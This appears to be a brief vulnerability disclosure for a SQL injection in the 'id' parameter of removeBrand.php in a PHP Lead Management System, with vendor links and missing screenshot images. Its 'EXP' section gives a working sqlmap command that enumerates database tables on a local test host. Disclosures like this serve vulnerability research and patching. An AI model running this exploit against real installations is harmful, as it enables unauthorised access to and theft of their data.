vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image-20221219162615294](C:\markdown\images\image-20221219162615294.png)

EXP:

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeBrand.php?id=1" --dbms=mysql -D penglead --tables
```

![image-20221219162423487](C:\markdown\images\image-20221219162423487.png)